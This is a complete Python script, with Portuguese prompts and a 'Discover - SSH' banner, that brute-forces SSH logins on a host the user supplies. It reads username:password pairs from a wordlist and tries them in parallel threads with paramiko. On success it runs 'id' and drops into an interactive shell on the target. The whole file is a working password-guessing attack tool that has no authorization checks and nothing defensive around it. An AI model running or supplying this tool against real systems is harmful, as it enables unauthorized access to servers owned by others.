import os
import sys
import select 
import paramiko
import threading
import termios
import tty
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

found_event = threading.Event()
lock = threading.Lock()

# Limpa tela
def cleanscreen():
    if sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")

def interactive_shell(client):
    channel = client.invoke_shell()
    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        while True:
            if channel.closed or channel.exit_status_ready():  # fecha o canal com exit digitado
                break
            if channel.recv_ready():
                sys.stdout.write(channel.recv(1024).decode(errors="ignore"))
                sys.stdout.flush()
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                data = sys.stdin.read(1)
                if not data:
                    break
                channel.send(data)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)

def tentar_login(host, port, username, password):
    if found_event.is_set():
        return
    try:
        conexao = paramiko.SSHClient()
        conexao.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        with lock:
            print(f"[>] Tentando {username}:{password}")
        conexao.connect(
            hostname=host,
            port=int(port),
            username=username,
            password=password,
            timeout=5,
            banner_timeout=16,
            auth_timeout=10,
            allow_agent=False,
            look_for_keys=False
        )
        stdin, stdout, stderr = conexao.exec_command("id")
        output = stdout.read().decode(errors="ignore")

        found_event.set()
        with lock:
            print(f"[+] LOGIN VÁLIDO: {username}:{password}")
            print(output)
        interactive_shell(conexao)
    except paramiko.AuthenticationException:
        pass
    except paramiko.SSHException:
        pass
    except ConnectionResetError:
        pass
    except Exception:
        pass
    finally:
        try:
            conexao.close()
        except:
            pass

# Programa principal
cleanscreen()
print("""\033[1;31m
 ____  _                                   _____ _____ _____
|    \|_|___ ___ ___ _ _ ___ ___    ___   |   __|   __|  |  |
|  |  | |_ -|  _| . | | | -_|  _|  |___|  |__   |__   |     |
|____/|_|___|___|___|\_/|___|_|           |_____|_____|__|__|
\033[m""")

try:
    host_ip_dns = input("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m Host alvo: ").strip()
    host_tports = input("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m Port host: ").strip()
except KeyboardInterrupt:
    sys.exit()

if host_ip_dns and host_tports:
    try:
        with open("sshpasswdwl.txt", "r") as pwdfile:
            linhas = pwdfile.readlines()
            print(f"\n\033[1;33m[*]\033[m\033[1m Tamanho da wordlist: {len(linhas)}\033[m")
            print("\033[1;33m[*]\033[m\033[1m Status:\033[m\033[1;32m Iniciado!\033[m\n")
            with ThreadPoolExecutor(max_workers=6) as executor:
                futures = []
                for user_pass in linhas:
                    if found_event.is_set():
                        break
                    credenciais = user_pass.strip().split(":")
                    if len(credenciais) != 2:
                        continue
                    username_sh = credenciais[0].strip()
                    password_sh = credenciais[1].strip()
                    futures.append(executor.submit(tentar_login, host_ip_dns, host_tports, username_sh, password_sh))
                for future in as_completed(futures):
                    if found_event.is_set():
                        break
    except KeyboardInterrupt:
        print("\n\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m Interrompido pelo usuário.")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Erro: {e}")
else:
    print("\n\033[1m[\033[m\033[1;31m>\033[m\033[1m]\033[m Passe um host e uma porta para se autenticar!\n")
